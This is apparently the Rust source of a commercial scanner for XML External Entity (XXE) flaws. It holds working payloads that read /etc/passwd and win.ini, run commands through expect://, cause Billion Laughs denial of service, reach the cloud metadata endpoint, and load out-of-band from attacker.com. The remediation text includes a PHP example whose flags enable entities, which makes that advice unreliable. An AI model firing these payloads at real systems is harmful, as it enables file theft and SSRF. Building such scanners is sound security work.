// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Bountyy Oy - XXE (XML External Entity) Scanner
 * Tests for XML External Entity injection vulnerabilities
 *
 * @copyright 2026 Bountyy Oy
 * @license Proprietary - Enterprise Edition
 */
use crate::detection_helpers::AppCharacteristics;
use crate::http_client::HttpClient;
use crate::scanners::parameter_filter::{ParameterFilter, ScannerType};
use crate::scanners::registry::PayloadIntensity;
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use anyhow::Result;
use std::sync::Arc;
use tracing::{debug, info};

pub struct XxeScanner {
    http_client: Arc<HttpClient>,
}

impl XxeScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self { http_client }
    }

    /// Scan parameter for XXE vulnerabilities (default intensity)
    pub async fn scan_parameter(
        &self,
        base_url: &str,
        parameter: &str,
        config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        self.scan_parameter_with_intensity(base_url, parameter, config, PayloadIntensity::Standard)
            .await
    }

    /// Scan parameter for XXE vulnerabilities with specified intensity (intelligent mode)
    pub async fn scan_parameter_with_intensity(
        &self,
        base_url: &str,
        parameter: &str,
        _config: &ScanConfig,
        intensity: PayloadIntensity,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        // Smart parameter filtering - XXE only works on XML parameters
        if ParameterFilter::should_skip_parameter(parameter, ScannerType::XXE) {
            debug!("[XXE] Skipping non-XML parameter: {}", parameter);
            return Ok((Vec::new(), 0));
        }

        info!(
            "[XXE] Intelligent scanner - parameter: {} (priority: {}, intensity: {:?})",
            parameter,
            ParameterFilter::get_parameter_priority(parameter),
            intensity
        );

        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // Check if this is a JSON-only API (GraphQL, REST API, etc)
        let baseline_response = self.http_client.get(base_url).await?;
        let characteristics = AppCharacteristics::from_response(&baseline_response, base_url);

        // Skip XXE for JSON-only APIs unless multipart/file upload is detected
        if characteristics.is_api && !characteristics.has_file_upload {
            let content_type = baseline_response
                .headers
                .get("content-type")
                .map(|s| s.to_lowercase())
                .unwrap_or_default();

            if content_type.contains("application/json")
                || content_type.contains("application/graphql")
                || baseline_response.body.trim_start().starts_with('{')
                || baseline_response.body.trim_start().starts_with('[')
            {
                info!("[XXE] Skipping XXE (JSON-only API without file upload - XXE requires XML parsing)");
                return Ok((vulnerabilities, tests_run));
            }
        }

        let payloads = self.generate_xxe_payloads();

        // Test each XXE payload
        for payload in &payloads {
            tests_run += 1;

            let test_url = if base_url.contains('?') {
                format!(
                    "{}&{}={}",
                    base_url,
                    parameter,
                    urlencoding::encode(payload)
                )
            } else {
                format!(
                    "{}?{}={}",
                    base_url,
                    parameter,
                    urlencoding::encode(payload)
                )
            };

            debug!(
                "Testing XXE payload: {} -> {}",
                parameter,
                payload.chars().take(50).collect::<String>()
            );

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if let Some(vuln) =
                        self.analyze_xxe_response(&response, payload, parameter, &test_url)
                    {
                        info!(
                            "[ALERT] XXE vulnerability detected in parameter '{}'",
                            parameter
                        );
                        vulnerabilities.push(vuln);
                        break; // Found vulnerability, stop testing this parameter
                    }
                }
                Err(e) => {
                    debug!("XXE test error: {}", e);
                }
            }
        }

        info!(
            "[SUCCESS] [XXE] Completed {} tests on parameter '{}', found {} vulnerabilities",
            tests_run,
            parameter,
            vulnerabilities.len()
        );

        Ok((vulnerabilities, tests_run))
    }

    /// Generate XXE injection payloads
    fn generate_xxe_payloads(&self) -> Vec<String> {
        vec![
            // Classic XXE - File disclosure (Linux)
            r#"<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>"#
                .to_string(),
            // Classic XXE - File disclosure (Windows)
            r#"<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root><data>&xxe;</data></root>"#
                .to_string(),
            // XXE with PHP expect wrapper (RCE)
            r#"<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "expect://id">
]>
<root><data>&xxe;</data></root>"#
                .to_string(),
            // XXE via parameter entities
            r#"<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
%dtd;
]>
<root><data>&send;</data></root>"#
                .to_string(),
            // Billion Laughs Attack (XXE DoS)
            r#"<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>"#
                .to_string(),
            // SSRF via XXE
            r#"<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>"#
                .to_string(),
            // XXE via SOAP
            r#"<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Body><data>&xxe;</data></soap:Body>
</soap:Envelope>"#
                .to_string(),
            // XXE via SVG file
            r#"<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text>
</svg>"#
                .to_string(),
            // XInclude attack
            r#"<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>"#
                .to_string(),
            // XXE with UTF-7 encoding bypass
            r#"+ADw?xml version=+ACI-1.0+ACI?+AD4
+ADw!DOCTYPE foo+AFs
+ADw!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI+AD4
+AF0+AD4
+ADw-root+AD4+ADw-data+AD4+ACY-xxe+ADsAPA-/data+AD4APA-/root+AD4"#
                .to_string(),
            // Blind XXE - Out of band
            r#"<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/xxe">
%xxe;
]>
<root></root>"#
                .to_string(),
            // XXE with base64 encoding
            r#"<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root><data>&xxe;</data></root>"#
                .to_string(),
        ]
    }

    /// Analyze HTTP response for XXE indicators
    fn analyze_xxe_response(
        &self,
        response: &crate::http_client::HttpResponse,
        payload: &str,
        parameter: &str,
        test_url: &str,
    ) -> Option<Vulnerability> {
        let body_lower = response.body.to_lowercase();

        // Check for file disclosure indicators (Linux /etc/passwd)
        let linux_file_indicators = vec![
            "root:x:",
            "daemon:",
            "bin:",
            "/bin/bash",
            "/usr/sbin/nologin",
        ];

        // Check for Windows file indicators
        let windows_file_indicators = vec![
            "[extensions]",
            "[mci extensions]",
            "[fonts]",
            "for 16-bit app support",
        ];

        // Check for AWS metadata (SSRF via XXE)
        let metadata_indicators = vec![
            "ami-id",
            "instance-id",
            "meta-data",
            "iam/security-credentials",
        ];

        // Check for XML parsing errors (indicates XML was processed)
        let error_indicators = vec![
            "xml parsing error",
            "external entity",
            "DOCTYPE",
            "entity",
            "xmlparseentityref",
            "entity not defined",
            "recursive entity",
        ];

        // Check for file content disclosure
        for indicator in &linux_file_indicators {
            if body_lower.contains(indicator) || response.body.contains(indicator) {
                return Some(self.create_vulnerability(
                    parameter,
                    payload,
                    test_url,
                    "XXE allows file disclosure - /etc/passwd content detected in response",
                    Confidence::High,
                    "Response contains /etc/passwd content (root:x: or similar)".to_string(),
                    Severity::Critical,
                    9.3,
                ));
            }
        }

        for indicator in &windows_file_indicators {
            if body_lower.contains(indicator) {
                return Some(self.create_vulnerability(
                    parameter,
                    payload,
                    test_url,
                    "XXE allows file disclosure - Windows system file content detected",
                    Confidence::High,
                    "Response contains Windows system file content".to_string(),
                    Severity::Critical,
                    9.3,
                ));
            }
        }

        // Check for metadata disclosure (SSRF)
        for indicator in &metadata_indicators {
            if body_lower.contains(indicator) {
                return Some(self.create_vulnerability(
                    parameter,
                    payload,
                    test_url,
                    "XXE allows SSRF - Cloud metadata endpoint accessible",
                    Confidence::High,
                    format!("Response contains cloud metadata: {}", indicator),
                    Severity::Critical,
                    9.1,
                ));
            }
        }

        // Check for XML parsing errors (potential blind XXE)
        for indicator in &error_indicators {
            if body_lower.contains(indicator) {
                return Some(self.create_vulnerability(
                    parameter,
                    payload,
                    test_url,
                    "Possible XXE vulnerability - XML parsing error detected",
                    Confidence::Medium,
                    format!("XML error message detected: {}", indicator),
                    Severity::High,
                    7.5,
                ));
            }
        }

        // Check for unusual response patterns (blind XXE)
        if payload.contains("lol4") && response.status_code == 500 {
            // Billion Laughs attack might cause server error
            return Some(self.create_vulnerability(
                parameter,
                payload,
                test_url,
                "Possible XXE DoS vulnerability - Billion Laughs attack caused server error",
                Confidence::Medium,
                "Server returned 500 error for entity expansion payload".to_string(),
                Severity::High,
                7.0,
            ));
        }

        None
    }

    /// Create vulnerability record
    fn create_vulnerability(
        &self,
        parameter: &str,
        payload: &str,
        test_url: &str,
        description: &str,
        confidence: Confidence,
        evidence: String,
        severity: Severity,
        cvss: f32,
    ) -> Vulnerability {
        Vulnerability {
            id: format!("xxe_{}", uuid::Uuid::new_v4().to_string()),
            vuln_type: "XML External Entity (XXE) Injection".to_string(),
            severity,
            confidence,
            category: "Injection".to_string(),
            url: test_url.to_string(),
            parameter: Some(parameter.to_string()),
            payload: payload.chars().take(200).collect::<String>(), // Truncate long payloads
            description: format!(
                "XXE vulnerability detected in parameter '{}'. {}. Attackers can read local files, perform SSRF, or cause DoS.",
                parameter, description
            ),
            evidence: Some(evidence),
            cwe: "CWE-611".to_string(), // Improper Restriction of XML External Entity Reference
            cvss,
            verified: true,
            false_positive: false,
            remediation: r#"IMMEDIATE ACTION REQUIRED:

1. **Disable External Entity Processing (Recommended)**

   **Java (JAXP):**
   ```java
   DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
   dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
   dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
   dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
   dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
   dbf.setXIncludeAware(false);
   dbf.setExpandEntityReferences(false);
   ```

   **PHP:**
   ```php
   libxml_disable_entity_loader(true);
   $dom = new DOMDocument();
   $dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR);
   ```

   **Python (defusedxml):**
   ```python
   from defusedxml import ElementTree as ET
   tree = ET.parse('file.xml')  # Safe by default
   ```

   **.NET:**
   ```csharp
   XmlReaderSettings settings = new XmlReaderSettings();
   settings.DtdProcessing = DtdProcessing.Prohibit;
   settings.XmlResolver = null;
   XmlReader reader = XmlReader.Create(stream, settings);
   ```

   **Node.js (libxmljs):**
   ```javascript
   const libxmljs = require('libxmljs');
   const xml = libxmljs.parseXml(xmlString, {
     noent: false,  // Disable entity substitution
     nonet: true    // Disable network access
   });
   ```

2. **Use Safe Parsers**
   - Use JSON instead of XML when possible
   - Use defusedxml (Python) or similar secure libraries
   - Keep XML parsers updated

3. **Input Validation**
   - Reject XML containing DOCTYPE declarations
   - Validate XML against strict schema (XSD)
   - Sanitize user-supplied XML before processing

4. **Whitelist Protocols**
   - Only allow specific protocols if external entities are required
   - Block file://, http://, ftp:// protocols
   - Use resource resolvers with strict whitelists

5. **Principle of Least Privilege**
   - Run XML parser with minimal OS permissions
   - Restrict file system access for application user
   - Use chroot/containers to isolate parser

6. **Web Application Firewall (WAF)**
   - Deploy WAF rules to detect XXE patterns
   - Block requests containing DOCTYPE, ENTITY keywords
   - Monitor for suspicious XML payloads

7. **Content-Type Validation**
   - Explicitly validate Content-Type header
   - Reject unexpected XML content
   - Use strict Accept headers

8. **Framework-Specific Guidance**

   **Spring Boot:**
   ```java
   @Bean
   public Jackson2ObjectMapperBuilder objectMapperBuilder() {
     Jackson2ObjectMapperBuilder builder = new Jackson2ObjectMapperBuilder();
     builder.featuresToDisable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES);
     return builder;
   }
   ```

   **Django:**
   ```python
   # Use defusedxml in settings
   import defusedxml
   defusedxml.defuse_stdlib()
   ```

9. **Testing**
   - Regularly test for XXE with OWASP ZAP or Burp Suite
   - Include XXE tests in security testing pipeline
   - Verify parser configuration in staging/production

10. **Monitor and Log**
    - Log all XML parsing errors
    - Alert on suspicious entity references
    - Monitor outbound connections from XML parser

References:
- OWASP XXE: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
- CWE-611: https://cwe.mitre.org/data/definitions/611.html
- PortSwigger XXE: https://portswigger.net/web-security/xxe
- defusedxml: https://github.com/tiran/defusedxml
"#.to_string(),
            discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_data: None,
        }
    }
}

// UUID generation helper
mod uuid {
    use rand::Rng;

    pub struct Uuid;

    impl Uuid {
        pub fn new_v4() -> Self {
            Self
        }

        pub fn to_string(&self) -> String {
            let mut rng = rand::rng();
            format!(
                "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
                rng.random::<u32>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u64>() & 0xffffffffffff
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    #[tokio::test]
    async fn test_xxe_payload_generation() {
        let scanner = XxeScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));
        let payloads = scanner.generate_xxe_payloads();

        // Should have comprehensive XXE payload set
        assert!(payloads.len() >= 10, "Should have at least 10 XXE payloads");

        // Check for key attack types
        assert!(
            payloads.iter().any(|p| p.contains("/etc/passwd")),
            "Missing /etc/passwd payload"
        );
        assert!(
            payloads.iter().any(|p| p.contains("win.ini")),
            "Missing Windows payload"
        );
        assert!(
            payloads.iter().any(|p| p.contains("lol")),
            "Missing Billion Laughs payload"
        );
        assert!(
            payloads.iter().any(|p| p.contains("169.254.169.254")),
            "Missing SSRF payload"
        );
    }

    #[test]
    fn test_file_disclosure_detection() {
        let scanner = XxeScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let response = crate::http_client::HttpResponse {
            status_code: 200,
            body:
                "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin"
                    .to_string(),
            headers: HashMap::new(),
            duration_ms: 100,
        };

        let result = scanner.analyze_xxe_response(
            &response,
            r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>"#,
            "xml",
            "http://example.com?xml=test",
        );

        assert!(result.is_some(), "Should detect /etc/passwd disclosure");
        let vuln = result.unwrap();
        assert_eq!(vuln.severity, Severity::Critical);
    }

    #[test]
    fn test_windows_file_disclosure() {
        let scanner = XxeScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let response = crate::http_client::HttpResponse {
            status_code: 200,
            body: "[fonts]\n[extensions]\n[mci extensions]".to_string(),
            headers: HashMap::new(),
            duration_ms: 100,
        };

        let result = scanner.analyze_xxe_response(
            &response,
            r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>"#,
            "xml",
            "http://example.com?xml=test",
        );

        assert!(result.is_some(), "Should detect Windows file disclosure");
        assert_eq!(result.unwrap().severity, Severity::Critical);
    }

    #[test]
    fn test_ssrf_via_xxe() {
        let scanner = XxeScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let response = crate::http_client::HttpResponse {
            status_code: 200,
            body: r#"{"ami-id": "ami-12345", "instance-id": "i-abcdef"}"#.to_string(),
            headers: HashMap::new(),
            duration_ms: 100,
        };

        let result = scanner.analyze_xxe_response(
            &response,
            r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>"#,
            "xml",
            "http://example.com?xml=test",
        );

        assert!(result.is_some(), "Should detect SSRF via XXE");
        assert_eq!(result.unwrap().severity, Severity::Critical);
    }

    #[test]
    fn test_no_false_positive() {
        let scanner = XxeScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let response = crate::http_client::HttpResponse {
            status_code: 200,
            body: "<html><body>Normal page content</body></html>".to_string(),
            headers: HashMap::new(),
            duration_ms: 100,
        };

        let result = scanner.analyze_xxe_response(
            &response,
            r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>"#,
            "xml",
            "http://example.com?xml=test",
        );

        assert!(
            result.is_none(),
            "Should not report false positive on normal response"
        );
    }
}
